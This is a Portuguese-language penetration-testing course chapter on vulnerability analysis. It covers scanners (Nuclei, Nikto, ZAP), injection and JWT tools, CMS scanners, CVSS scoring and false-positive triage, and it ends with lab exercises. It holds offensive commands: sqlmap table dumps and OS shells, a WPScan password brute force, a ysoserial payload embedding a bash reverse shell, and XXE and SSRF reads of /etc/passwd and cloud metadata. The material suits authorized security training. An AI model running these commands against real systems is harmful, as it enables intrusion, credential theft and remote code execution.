# 05 · Análise de Vulnerabilidades

> [← Anterior: Enumeração](../04-enumeracao/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Exploração →](../06-exploracao/README.md)

---

## Princípio

Identificar vulnerabilidades de forma automatizada **e** manual, priorizando por criticidade (CVSS) e explorabilidade real.

> Scanner automatizado sem revisão manual = 30% de falsos positivos no mínimo. Toda saída de scanner deve ser validada.

---

## 1. Scanners de Templates Modernos

### Nuclei (ProjectDiscovery) — o padrão atual

Scanner baseado em templates YAML, mantido pela comunidade, com milhares de checks.

```bash
# Atualizar templates antes de tudo
nuclei -update-templates

# Scan básico por severidade
nuclei -u https://alvo.com.br -severity critical,high

# Scan focado em CVEs conhecidos
nuclei -u https://alvo.com.br -t cves/ -o nuclei-cves.txt

# Múltiplos targets
nuclei -l live.txt -t cves/ -t misconfigurations/ -t exposures/ \
       -severity critical,high,medium \
       -o nuclei-all.txt

# Categorias úteis
nuclei -l live.txt -t exposures/tokens/   # tokens expostos
nuclei -l live.txt -t misconfigurations/  # mis-configs
nuclei -l live.txt -t takeovers/          # subdomain takeover
nuclei -l live.txt -t default-logins/     # credenciais padrão
```

Escrever seu próprio template:

```yaml
id: exemplo-api-exposed
info:
  name: API de debug exposta
  severity: high
requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/debug"
    matchers:
      - type: word
        words:
          - "debug_mode"
          - "stack_trace"
```

---

## 2. Scanners Clássicos

### Nikto

Scanner web clássico, 25+ anos, ainda útil para baseline rápido.

```bash
nikto -h https://alvo.com.br -o nikto.html -Format html
nikto -h https://alvo.com.br -Tuning x   # desabilita DoS tests
```

### Burp Suite Scanner (Pro)

Escaneia automaticamente cada endpoint mapeado durante o crawling. Baseline passive scan é contínuo no Community Edition.

### OWASP ZAP Active Scan

```bash
zap-cli quick-scan --self-contained https://alvo.com.br
```

### Skipfish

Scanner do Google, ainda disponível, rápido.

```bash
skipfish -o skipfish-out https://alvo.com.br
```

---

## 3. Scanners de Infraestrutura

Complementam os scanners web com vulnerabilidades de rede/SO.

| Ferramenta | Licença | Perfil |
|---|---|---|
| **Nessus** | Comercial (gratuito Essentials até 16 IPs) | Padrão da indústria |
| **OpenVAS / Greenbone** | Open-source | Alternativa ao Nessus |
| **Qualys** | SaaS | Cloud-first, grandes empresas |

---

## 4. Testes Específicos por Vulnerabilidade

### SQL Injection — SQLMap

```bash
# Teste inicial em parâmetro GET
sqlmap -u "https://alvo.com.br/page?id=1" --batch

# POST via request do Burp (salva request em arquivo)
sqlmap -r request.txt --batch --dbs

# Extração completa após confirmar
sqlmap -u "..." --batch -D nome_db -T users --dump

# Nível e risco máximo (mais testes, mais lento)
sqlmap -u "..." --level=5 --risk=3 --batch

# Em cookie
sqlmap -u "..." --cookie="session=abc*" --level=2

# Shell do SO via SQLi (Impacto máximo)
sqlmap -u "..." --os-shell
```

### XSS

**XSStrike** — detecção avançada com DOM e filtros.

```bash
xsstrike -u "https://alvo.com.br/search?q=test"
xsstrike -u "..." --crawl
```

**Dalfox** — rápido e moderno.

```bash
dalfox url "https://alvo.com.br/search?q=test"
dalfox file urls.txt --blind https://seu-collaborator.oastify.com
```

### SSRF — SSRFmap

```bash
ssrfmap -r request.txt -p url -m readfiles
ssrfmap -r request.txt -p url -m portscan
```

Alvos clássicos de SSRF:
- `http://127.0.0.1:80`
- `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- `http://metadata.google.internal/` (GCP)
- `file:///etc/passwd`

### SSTI — tplmap

```bash
tplmap -u "https://alvo.com.br/page?name=test"
tplmap -u "..." --os-shell
```

### LFI/RFI — LFISuite

Automatiza testes de Local/Remote File Inclusion com bypasses comuns.

```bash
python3 lfisuite.py
# segue menu interativo
```

### CORS Misconfig — CORScanner

```bash
python3 cors_scan.py -u https://alvo.com.br -d
```

### XXE — XXEinjector

```bash
ruby XXEinjector.rb --host=SEU_IP --file=request.txt --path=/etc/passwd
```

### JWT — jwt_tool

```bash
# Analisar
jwt_tool <token>

# Testar alg:none
jwt_tool <token> -X a

# Brute force de segredo HMAC
jwt_tool <token> -C -d wordlist.txt

# Key confusion (RS256 → HS256)
jwt_tool <token> -X k -pk chave_publica.pem

# Todos os testes automáticos
jwt_tool <token> -M at
```

### Desserialização — ysoserial

Java:
```bash
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,BASE64}|{base64,-d}|{bash,-i}" > payload.bin
```

.NET: **ysoserial.net**.

### Subdomain Takeover

```bash
subjack -w subs.txt -t 50 -ssl -c fingerprints.json -o takeovers.txt
# ou
nuclei -l subs.txt -t takeovers/
```

Referência de fingerprints: [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz).

---

## 5. Análise de CMS

### WordPress — WPScan

```bash
# Scan completo
wpscan --url https://alvo.com.br -e vp,vt,u,dbe --api-token SEU_TOKEN

# Brute force de login
wpscan --url https://alvo.com.br -U admin -P rockyou.txt
```

Opções úteis:
- `-e vp` vulnerable plugins · `vt` vulnerable themes · `u` users · `dbe` db exports

### Joomla — JoomScan

```bash
joomscan -u https://alvo.com.br
```

### Drupal — Droopescan

```bash
droopescan scan drupal -u https://alvo.com.br
```

### Magento — MageScan

```bash
magescan scan:all https://alvo.com.br
```

---

## 6. Classificação de Achados (CVSS)

Todo achado deve ser classificado. Use o [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3-1).

**Métricas base:**
- **AV** Attack Vector (Network / Adjacent / Local / Physical)
- **AC** Attack Complexity (Low / High)
- **PR** Privileges Required (None / Low / High)
- **UI** User Interaction (None / Required)
- **S** Scope (Unchanged / Changed)
- **C, I, A** CIA impact (None / Low / High)

Exemplo de vetor para SQLi com leitura completa:
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
```

---

## 7. Triagem de Falsos Positivos

**Regra:** nenhum achado vai para o relatório sem:

1. **Request + Response completos** salvos (screenshot ou .http)
2. **Reprodução manual** confirmada
3. **Impacto concreto** demonstrado (não apenas "detectado pelo scanner")
4. **Recomendação de correção** aplicável ao contexto

Um achado "Missing X-Frame-Options" do Nikto sem contexto não vale nada. Um achado "Clickjacking em /transfer permitindo redirecionar fundos" vale muito.

---

## Exercícios

1. Rode Nuclei em [OWASP Juice Shop local](https://github.com/juice-shop/juice-shop) com templates `critical,high`. Quantos achados? Quais são falsos positivos?
2. No DVWA (nível low), confirme SQLi manualmente e depois use SQLMap. Compare os dois workflows.
3. Gere um vetor CVSS para cada uma das vulnerabilidades que encontrou no Juice Shop e justifique cada métrica.

---

[← Anterior: Enumeração](../04-enumeracao/README.md) · [Voltar ao índice](../../README.md) · [Próximo: Exploração →](../06-exploracao/README.md)
